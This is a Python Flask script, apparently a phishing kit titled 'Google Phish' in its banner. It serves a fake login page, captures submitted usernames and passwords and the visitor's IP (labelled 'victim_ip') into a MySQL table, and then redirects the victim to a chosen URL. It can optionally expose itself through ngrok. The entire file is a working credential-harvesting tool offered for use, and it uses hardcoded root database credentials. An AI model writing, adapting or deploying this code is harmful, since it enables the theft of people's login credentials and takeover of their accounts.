from flask import Flask, request, send_from_directory, redirect
import os
import mysql.connector
from mysql.connector import Error
from datetime import datetime

app = Flask(__name__)

# Database connection details
DB_CONFIG = {
    "host": "localhost",
    "user": "root",
    "password": "root",
    "database": "db1"
}

def init_db():
    try:
        conn = mysql.connector.connect(host=DB_CONFIG["host"], user=DB_CONFIG["user"], password=DB_CONFIG["password"])
        cursor = conn.cursor()
        cursor.execute("SHOW DATABASES;")
        databases = [db[0] for db in cursor.fetchall()]

        if DB_CONFIG["database"] not in databases:
            print(f"Database '{DB_CONFIG['database']}' not found. Creating now...")
            cursor.execute(f"CREATE DATABASE {DB_CONFIG['database']};")
            conn.commit()

        conn.close()

        conn = mysql.connector.connect(**DB_CONFIG)
        cursor = conn.cursor()
        # Create table or alter IP column if it already exists
        cursor.execute('''
        CREATE TABLE IF NOT EXISTS input (
            sn INT AUTO_INCREMENT PRIMARY KEY,
            time VARCHAR(10),
            date VARCHAR(10),
            ip VARCHAR(100),
            username VARCHAR(255),
            password VARCHAR(255)
        )
        ''')
        # Ensure IP column is wide enough (in case table existed before)
        cursor.execute("ALTER TABLE input MODIFY ip VARCHAR(100)")
        conn.commit()
        conn.close()
    except Error as e:
        print(f"Error connecting to MySQL: {e}")

@app.route('/')
def serve_index():
    return send_from_directory(os.getcwd(), 'index.html')

@app.route('/get', methods=['GET'])
def capture_data():
    username = request.args.get('name', 'N/A')
    password = request.args.get('password', 'N/A')

    # Get real IP from X-Forwarded-For header
    full_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    victim_ip = full_ip.split(',')[0].strip()

    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    current_date = now.strftime("%Y-%m-%d")

    try:
        conn = mysql.connector.connect(**DB_CONFIG)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO input (time, date, ip, username, password) VALUES (%s, %s, %s, %s, %s)", 
                       (current_time, current_date, victim_ip, username, password))
        conn.commit()
        conn.close()
    except Error as e:
        print(f"Error inserting data into MySQL: {e}")
    
    return redirect(REDIRECTION_URL)

if __name__ == '__main__':
    init_db()

    print("""
    
                                   (                       
 (                        (        )\\ )    )            )  
 )\\ )              (  (   )\\   (  (()/( ( /( (       ( /(  
(()/(     (    (   )\\))( ((_) ))\\  /(_)))\\()))\\  (   )\\()) 
 /(_))_   )\\   )\\ ((_))\\  _  /((_)(_)) ((_\\((_) )\\ ((_\\  
(_)) __| ((_) ((_) (()(_)| |(_))  | _ \\| |(_)(_)((_)| |(_) 
  | (_ |/ _ \\/ _ \\/ _` | | |/ -_) |  _/| ' \\ | |(_-<| ' \\  
   \\___|\\___/\\___/\\__, | |_|\\___| |_|  |_||_||_|/__/|_||_| 
                  |___/                                    
    
                     By Shirish Bhan
    """)
    print("Select a port forwarding service:\n")
    print("[1] Localhost")
    print("[2] Ngrok\n")
    choice = input("Enter choice: ")
    REDIRECTION_URL = input("Enter redirection URL: ")

    if choice == "1":
        app.run(host='127.0.0.1', port=5000, debug=False)
    elif choice == "2":
        os.system("start cmd /k ngrok http 5000")
        app.run(host='127.0.0.1', port=5000, debug=False)
    else:
        print("Invalid choice! Exiting...")
